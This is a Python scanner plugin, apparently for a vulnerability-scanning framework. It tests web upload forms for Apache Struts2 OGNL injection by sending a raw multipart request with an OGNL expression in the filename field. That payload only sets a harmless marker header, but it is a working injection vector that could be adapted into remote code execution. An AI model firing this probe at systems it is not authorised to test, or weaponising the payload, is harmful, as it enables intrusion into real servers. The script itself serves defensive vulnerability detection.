#!/usr/bin/env python
# coding:utf-8
import socket
import urlparse
import random


def assign(service, arg):
    if service == fingerprint.www_form:
        return True, arg


def audit(arg):
    input_file_name = None
    for x in arg['inputs']:
        if x['type'] == 'file':
            input_file_name = x['name']
            break
    if input_file_name is None:
        return
    uri = urlparse.urlparse(arg['action']).path
    http_host = urlparse.urlparse(arg['action']).netloc
    host = None
    port = 80
    if ':' in http_host:
        host = http_host.split(':')[0]
        port = int(http_host.split(':')[1])
    else:
        host = http_host

    randint1 = str(random.randint(1000, 10000))
    raw = """POST {uri} HTTP/1.1
Host: {http_host}
Content-Length: 1000000000
Cache-Control: max-age=0
Origin: {referer}
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: {referer}
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close

------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="{input_file_name}"; filename="%{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test-{randint1}','Kaboom')}}"
Content-Type: text/plain


foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--
""".format(uri=uri, http_host=http_host, referer=arg['ref'], input_file_name=input_file_name, randint1=randint1).replace('\n', '\r\n')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(20)
    s.connect((host, port))
    s.send(raw)
    data = s.recv(1024)
    if 'X-Test-%s' % (randint1) in data:
        security_hole("%s" % arg, log={'request': raw, 'response': data})

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.www_form, {'action': 'http://127.0.0.1:8080/doUpload.action', 'inputs': [{'type': u'file', 'name': u'upload', 'value': u'minimum'}],'ref': 'http://127.0.0.1:8080/doUpload.action', 'method': u'post'})[1])
